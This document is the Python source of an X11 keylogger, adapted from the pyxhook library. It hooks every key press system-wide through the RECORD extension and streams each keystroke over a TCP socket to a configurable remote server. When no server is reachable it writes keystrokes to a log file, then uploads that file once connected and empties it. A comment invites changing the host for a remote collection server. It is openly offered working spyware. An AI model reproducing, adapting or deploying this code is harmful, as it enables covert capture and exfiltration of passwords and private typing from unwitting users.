#Update the host name if your server is at diffrent location.
#update log file address

from __future__ import print_function

import socket
import sys
import re
import time
import threading
import subprocess
from Xlib import X, XK, display
from Xlib.ext import record
from Xlib.protocol import rq

HOST = 'localhost'
PORT = 55555
BUFSIZ = 4096
client_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock_addr = (HOST, int(PORT))
log_file='/root/Desktop/file.log'

class HookManager(threading.Thread):
    """ This is the main class. Instantiate it, and you can hand it KeyDown
        and KeyUp (functions in your own code) which execute to parse the
        pyxhookkeyevent class that is returned.

        This simply takes these two values for now:
        KeyDown : The function to execute when a key is pressed, if it
                  returns anything. It hands the function an argument that
                  is the pyxhookkeyevent class.
        KeyUp   : The function to execute when a key is released, if it
                  returns anything. It hands the function an argument that is
                  the pyxhookkeyevent class.
    """

    def __init__(self,parameters=False):
        threading.Thread.__init__(self)
        self.finished = threading.Event()

        # Give these some initial values
        self.mouse_position_x = 0
        self.mouse_position_y = 0
        if (subprocess.getoutput("xset q | grep Caps")[21:24] == 'off'):
            self.ison = {"shift": False, "caps": False}
            if (subprocess.getoutput("xset q | grep Num")[45:48] == 'off'):
                self.ison["num"] = False
            elif (subprocess.getoutput("xset q | grep Num")[45:48] == 'on '):
                self.ison["num"] = True
        elif (subprocess.getoutput("xset q | grep Caps")[21:24] == 'on '):
            self.ison = {"shift": False, "caps": True}
            self.ison["shift"] = self.ison["shift"] + 1
            if (subprocess.getoutput("xset q | grep Num")[45:48] == 'off'):
                self.ison["num"] = False
            elif (subprocess.getoutput("xset q | grep Num")[45:48] == 'on '):
                self.ison["num"] = True

#        print(self.ison)

        # Compile our regex statements.
        self.isshift = re.compile('^Shift')
        self.iscaps = re.compile('^Caps_Lock')
        self.isnum = re.compile('^Num_Lock')
        self.shiftablechar = re.compile('|'.join((
            '^[a-z0-9]$',
            '^minus$',
            '^equal$',
            '^bracketleft$',
            '^bracketright$',
            '^semicolon$',
            '^backslash$',
            '^apostrophe$',
            '^comma$',
            '^period$',
            '^slash$',
            '^grave$'
        )))
        self.logrelease = re.compile('.*')
        self.isspace = re.compile('^space$')
        # Choose which type of function use
        self.parameters=parameters
        if parameters:
            self.lambda_function=lambda x,y: True
        else:
            self.lambda_function=lambda x: True
        # Assign default function actions (do nothing).
        self.KeyDown = self.lambda_function
        self.KeyUp = self.lambda_function
        self.MouseAllButtonsDown = self.lambda_function
        self.MouseAllButtonsUp = self.lambda_function
        self.MouseMovement = self.lambda_function
        
        self.KeyDownParameters = {}
        self.KeyUpParameters = {}
        self.MouseAllButtonsDownParameters = {}
        self.MouseAllButtonsUpParameters= {}
        self.MouseMovementParameters = {}

        self.contextEventMask = [X.KeyPress, X.MotionNotify]

        # Hook to our display.
        self.local_dpy = display.Display()
        self.record_dpy = display.Display()

    def run(self):
        # Check if the extension is present
        if not self.record_dpy.has_extension("RECORD"):
            print("RECORD extension not found", file=sys.stderr)
            sys.exit(1)
        # r = self.record_dpy.record_get_version(0, 0)
        # print("RECORD extension version {major}.{minor}".format(
        #     major=r.major_version,
        #     minor=r.minor_version
        # ))

        # Create a recording context; we only want key and mouse events
        self.ctx = self.record_dpy.record_create_context(
            0,
            [record.AllClients],
            [{
                'core_requests': (0, 0),
                'core_replies': (0, 0),
                'ext_requests': (0, 0, 0, 0),
                'ext_replies': (0, 0, 0, 0),
                'delivered_events': (0, 0),
                #                (X.KeyPress, X.ButtonPress),
                'device_events': tuple(self.contextEventMask),
                'errors': (0, 0),
                'client_started': False,
                'client_died': False,
            }])

        # Enable the context; this only returns after a call to
        # record_disable_context, while calling the callback function in the
        # meantime
        self.record_dpy.record_enable_context(self.ctx, self.processevents)
        # Finally free the context
        self.record_dpy.record_free_context(self.ctx)

    def cancel(self,flag,flag_2):
        if flag and (not flag_2):
            try:
                client_sock.send("Connection Closed".encode('utf-8'))
                client_sock.shutdown(2)
                client_sock.close()
            except:
                pass
        if not flag:
            global fob
            print("Closing File")
            fob.close()
        self.finished.set()
        self.local_dpy.record_disable_context(self.ctx)
        self.local_dpy.flush()
        raise SystemExit(0)

    def printevent(self, event):
        print(event)

    def HookKeyboard(self):
        # We don't need to do anything here anymore, since the default mask
        # is now set to contain X.KeyPress
        # self.contextEventMask[0] = X.KeyPress
        pass

    def HookMouse(self):
        # We don't need to do anything here anymore, since the default mask
        # is now set to contain X.MotionNotify
        # need mouse motion to track pointer position, since ButtonPress
        # events don't carry that info.
        # self.contextEventMask[1] = X.MotionNotify
        pass

    def processhookevents(self,action_type,action_parameters,events):
        # In order to avoid duplicate code, i wrote a function that takes the
        # input value of the action function and, depending on the initialization, 
        # launches it or only with the event or passes the parameter
        if self.parameters:
            action_type(events,action_parameters)
        else:
            action_type(events)


    def processevents(self, reply):
        if reply.category != record.FromServer:
            return
        if reply.client_swapped:
            print("* received swapped protocol data, cowardly ignored")
            return
        try:
            # Get int value, python2.
            intval = ord(reply.data[0])
        except TypeError:
            # Already bytes/ints, python3.
            intval = reply.data[0]
        if (not reply.data) or (intval < 2):
            # not an event
            return
        data = reply.data
        while len(data):
            event, data = rq.EventField(None).parse_binary_value(data,self.record_dpy.display,None,None)
            if event.type == X.KeyPress:
                hookevent = self.keypressevent(event)
                self.processhookevents(self.KeyDown,self.KeyDownParameters,hookevent)
            elif event.type == X.KeyRelease:
                hookevent = self.keyreleaseevent(event)
                self.processhookevents(self.KeyUp,self.KeyUpParameters,hookevent)
            elif event.type == X.ButtonPress:
                hookevent = self.buttonpressevent(event)
                self.processhookevents(self.MouseAllButtonsDown,self.MouseAllButtonsDownParameters,hookevent)
            elif event.type == X.ButtonRelease:
                hookevent = self.buttonreleaseevent(event)
                self.processhookevents(self.MouseAllButtonsUp,self.MouseAllButtonsUpParameters,hookevent)
#            elif event.type == X.MotionNotify:
                # use mouse moves to record mouse position, since press and
                # release events do not give mouse position info
                # (event.root_x and event.root_y have bogus info).
#                hookevent = self.mousemoveevent(event)
#                self.processhookevents(self.MouseMovement,self.MouseMovementParameters,hookevent)

        # print("processing events...", event.type)

    def keypressevent(self, event):
        matchto = self.lookup_keysym(self.local_dpy.keycode_to_keysym(event.detail, 0))
        if self.shiftablechar.match(self.lookup_keysym(self.local_dpy.keycode_to_keysym(event.detail, 0))):
            # This is a character that can be typed.
            if not self.ison["shift"]:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
                if (self.ison["caps"] == True ) & ( (keysym in range(32,65)) | (keysym in range(91,97)) | (keysym in range(123,127)) ):
                	keysym = self.local_dpy.keycode_to_keysym(event.detail, 1)
                return self.makekeyhookevent(keysym, event)
            else:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 1)
                if (self.ison["caps"] == True ) & ( (keysym in range(32,65)) | (keysym in range(91,97)) | (keysym in range(123,127)) ):
                	keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
                return self.makekeyhookevent(keysym, event)
        else:
            # Not a typable character.
            keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
            if self.isshift.match(matchto):
                if (self.ison["caps"] == False):
                    self.ison["shift"] = self.ison["shift"] + 1
                elif (self.ison["caps"] == True):
                    self.ison["shift"] = self.ison["shift"] - 1
            elif self.iscaps.match(matchto):
                if not self.ison["caps"]:
                    self.ison["shift"] = self.ison["shift"] + 1
                    self.ison["caps"] = True
                else:
                    self.ison["shift"] = self.ison["shift"] - 1
                    self.ison["caps"] = False
            elif self.isnum.match(matchto):
                if (self.ison["num"] == False):
                    self.ison["num"] = True
                elif (self.ison["num"] == True):
                    self.ison["num"] = False
            if (self.ison["num"] == True):
                if (keysym == 65436):
                    keysym = 65457
                if (keysym == 65433):
                    keysym = 65458
                if (keysym == 65435):
                    keysym = 65459
                if (keysym == 65430):
                    keysym = 65460
                if (keysym == 65437):
                    keysym = 65461
                if (keysym == 65432):
                    keysym = 65462
                if (keysym == 65429):
                    keysym = 65463
                if (keysym == 65431):
                    keysym = 65464
                if (keysym == 65434):
                    keysym = 65465
                if (keysym == 65438):
                    keysym = 65456
                if (keysym == 65439):
                	keysym = 65454
               
#            print("keysym : ",keysym)
            return self.makekeyhookevent(keysym, event)

    def keyreleaseevent(self, event):
        if self.shiftablechar.match(
                self.lookup_keysym(
                    self.local_dpy.keycode_to_keysym(event.detail, 0))):
            if not self.ison["shift"]:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
            else:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 1)
        else:
            keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
        matchto = self.lookup_keysym(keysym)
        if self.isshift.match(matchto):
            if (self.ison["caps"] == False):
                self.ison["shift"] = self.ison["shift"] - 1
            elif (self.ison["caps"] == True):
                self.ison["shift"] = self.ison["shift"] + 1
        return self.makekeyhookevent(keysym, event)

    def buttonpressevent(self, event):
        # self.clickx = self.rootx
        # self.clicky = self.rooty
        return self.makemousehookevent(event)

    def buttonreleaseevent(self, event):
        # if (self.clickx == self.rootx) and (self.clicky == self.rooty):
        #     # print("ButtonClock {detail} x={s.rootx y={s.rooty}}".format(
        #     #    detail=event.detail,
        #     #    s=self,
        #     # ))
        #     if event.detail in (1, 2, 3):
        #         self.captureclick()
        # else:
        #     pass
        #     print("ButtonDown {detail} x={s.clickx} y={s.clicky}".format(
        #         detail=event.detail,
        #         s=self
        #     ))
        #     print("ButtonUp {detail} x={s.rootx} y={s.rooty}".format(
        #         detail=event.detail,
        #         s=self
        #     ))
        return self.makemousehookevent(event)

    def mousemoveevent(self, event):
#        self.mouse_position_x = event.root_x
#        self.mouse_position_y = event.root_y
#        return self.makemousehookevent(event)
        pass

    # need the following because XK.keysym_to_string() only does printable
    # chars rather than being the correct inverse of XK.string_to_keysym()
    def lookup_keysym(self, keysym):
        for name in dir(XK):
            if name.startswith("XK_") and (getattr(XK, name) == keysym):
                return name[3:]
                #return name.lstrip("XK_")
        return "[{}]".format(keysym)

    def asciivalue(self, keysym):
        asciinum = XK.string_to_keysym(self.lookup_keysym(keysym))
        return asciinum % 256

    def makekeyhookevent(self, keysym, event):
        storewm = self.xwindowinfo()
        if event.type == X.KeyPress:
            MessageName = "key down"
        elif event.type == X.KeyRelease:
            MessageName = "key up"
        return pyxhookkeyevent(
            storewm["handle"],
            storewm["name"],
            storewm["class"],
            self.lookup_keysym(keysym),
            self.asciivalue(keysym),
            False,
            event.detail,
            MessageName
        )

    def makemousehookevent(self, event):
#        storewm = self.xwindowinfo()
#        if event.detail == 1:
#            MessageName = "mouse left "
#        elif event.detail == 3:
#            MessageName = "mouse right "
#        elif event.detail == 2:
#            MessageName = "mouse middle "
#        elif event.detail == 5:
#            MessageName = "mouse wheel down "
#        elif event.detail == 4:
#            MessageName = "mouse wheel up "
#        else:
#            MessageName = "mouse {} ".format(event.detail)

#        if event.type == X.ButtonPress:
#            MessageName = "{} down".format(MessageName)
#        elif event.type == X.ButtonRelease:
#            MessageName = "{} up".format(MessageName)
#        else:
#            MessageName = "mouse moved"
#        return pyxhookmouseevent(
#            storewm["handle"],
#            storewm["name"],
#            storewm["class"],(self.mouse_position_x, self.mouse_position_y),MessageName)
        pass

    def xwindowinfo(self):
        try:
            windowvar = self.local_dpy.get_input_focus().focus
            wmname = windowvar.get_wm_name()
            wmclass = windowvar.get_wm_class()
            wmhandle = str(windowvar)[20:30]
        except:
            # This is to keep things running smoothly.
            # It almost never happens, but still...
            return {"name": None, "class": None, "handle": None}
        if (wmname is None) and (wmclass is None):
            try:
                windowvar = windowvar.query_tree().parent
                wmname = windowvar.get_wm_name()
                wmclass = windowvar.get_wm_class()
                wmhandle = str(windowvar)[20:30]
            except:
                # This is to keep things running smoothly.
                # It almost never happens, but still...
                return {"name": None, "class": None, "handle": None}
        if wmclass is None:
            return {"name": wmname, "class": wmclass, "handle": wmhandle}
        else:
            return {"name": wmname, "class": wmclass[0], "handle": wmhandle}


class pyxhookkeyevent:
    """ This is the class that is returned with each key event.f
        It simply creates the variables below in the class.

        Window         : The handle of the window.
        WindowName     : The name of the window.
        WindowProcName : The backend process for the window.
        Key            : The key pressed, shifted to the correct caps value.
        Ascii          : An ascii representation of the key. It returns 0 if
                         the ascii value is not between 31 and 256.
        KeyID          : This is just False for now. Under windows, it is the
                         Virtual Key Code, but that's a windows-only thing.
        ScanCode       : Please don't use this. It differs for pretty much
                         every type of keyboard. X11 abstracts this
                         information anyway.
        MessageName    : "key down", "key up".
    """

    def __init__(self, Window, WindowName, WindowProcName, Key, Ascii, KeyID,ScanCode, MessageName):
        self.Window = Window
        self.WindowName = WindowName
        self.WindowProcName = WindowProcName
        self.Key = Key
        self.Ascii = Ascii
#        self.KeyID = KeyID
        self.ScanCode = ScanCode
        self.MessageName = MessageName

    def __str__(self):
        global flag
        if flag:
            try:
                client_sock.send((self.Key).encode('utf-8'))
#                self.data = client_sock.recv(1024)
#                if not self.data:
#                    break
#                if (self.data).decode('utf-8') == 'grave':
#                    hm.cancel()
            except:
#                print("Disconnected Writing To File")
                global fob
                fob=open(log_file,'a')
                fob.write(self.Key)
                fob.write(' ')
                fob.close()
        if not flag:
#            global fob
            fob=open(log_file,'a')
            fob.write(self.Key)
            fob.write(' ')
        #client_sock.send('\n'.encode('utf-8'))
        return '\n'.join((
#            'Window Handle: {s.Window}',
#            'Window Name: {s.WindowName}',
#            'Window\'s Process Name: {s.WindowProcName}',
            'Key Pressed: {s.Key}',
#            'Ascii Value: {s.Ascii}',
#            'KeyID: {s.KeyID}',
#            'ScanCode: {s.ScanCode}',
#            'MessageName: {s.MessageName}',
        )).format(s=self)


#class pyxhookmouseevent:
#    """This is the class that is returned with each key event.f
#    It simply creates the variables below in the class.
#
#        Window         : The handle of the window.
#        WindowName     : The name of the window.
#        WindowProcName : The backend process for the window.
#        Position       : 2-tuple (x,y) coordinates of the mouse click.
#        MessageName    : "mouse left|right|middle down",
#                         "mouse left|right|middle up".
#    """

#    def __init__(
#            self, Window, WindowName, WindowProcName, Position, MessageName):
#        self.Window = Window
#        self.WindowName = WindowName
#        self.WindowProcName = WindowProcName
#        self.Position = Position
#        self.MessageName = MessageName

#    def __str__(self):
#        return '\n'.join((
#            'Window Handle: {s.Window}',
#            'Window\'s Process Name: {s.WindowProcName}',
#            'Position: {s.Position}',
#            'MessageName: {s.MessageName}',)).format(s=self)

flag = False
flag_2 = False

def connect_socket(sock_addr):
    global client_sock,flag_2
    try:
        client_sock.connect(sock_addr)
        flag = True
        return flag
    except:
        flag = False
        flag_2 = True
        return flag

if __name__ == '__main__':
    hm = HookManager()
    hm.daemon = True
    hm.HookKeyboard()
#    hm.HookMouse()
    hm.KeyDown = hm.printevent
#    hm.KeyUp = hm.printevent
#    hm.MouseAllButtonsDown = hm.printevent
#    hm.MouseAllButtonsUp = hm.printevent
#    hm.MouseMovement = hm.printevent
    try:
        flag = connect_socket(sock_addr)
        if flag == True:
            print("Connected.\nSending To Server")
            hm.start()
            fopen = open(log_file,'r+b')
            client_sock.sendfile(fopen)
            fopen.truncate(0)
            fopen.close()
            while True:
                time.sleep(0)
        elif flag == False:
            print("Not Connected.\nWriting To File")
            hm.start()
            while (not flag):
                #flag = connect_socket(sock_addr)
                time.sleep(10)
    except KeyboardInterrupt:
        hm.cancel(flag,flag_2)
#    hm.start()
#    time.sleep(10)
#    hm.cancel()
